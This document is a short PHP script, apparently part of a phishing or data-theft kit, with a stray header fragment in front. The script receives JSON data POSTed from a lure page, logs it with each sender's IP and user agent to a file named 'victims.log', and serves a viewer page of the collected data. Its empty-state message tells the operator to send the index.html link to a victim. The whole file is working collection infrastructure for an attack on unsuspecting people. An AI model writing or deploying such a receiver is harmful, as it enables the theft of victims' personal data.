<?php
header('Content-Type: text/html; charset=utf-8');
mb_internal_encoding('UTF-8');
// ... phần code còn lại
<?php
// server.php - Receiver + Viewer integrated
$log_file = 'victims.log';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['data'])) {
    $raw_data = $_POST['data'];
    $decoded = json_decode($raw_data, true);
    
    $entry = "[$time] IP: $ip | UA: $user_agent\n";
    $entry .= "DATA: " . print_r($decoded, true) . "\n";
    $entry .= str_repeat('-', 80) . "\n";
    
    file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);
    
    http_response_code(200);
    echo 'OK';
    exit;
}

if (file_exists($log_file)) {
    $content = file_get_contents($log_file);
    $content = nl2br(htmlspecialchars($content));
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Viewer - Log Data</title>";
    echo "<style>body{background:#1e1e1e;color:#d4d4d4;font-family:Consolas,monospace;padding:20px;white-space:pre-wrap;word-wrap:break-word;}";
    echo ".entry{border-bottom:1px solid #444;padding:10px 0;}</style></head><body>";
    echo "<h2>Data collected (" . count(file($log_file)) . " lines)</h2>";
    echo "<div class='entry'>" . $content . "</div>";
    echo "</body></html>";
} else {
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Viewer</title></head><body>";
    echo "<h2>No data yet. Send index.html link to victim.</h2>";
    echo "</body></html>";
}
?>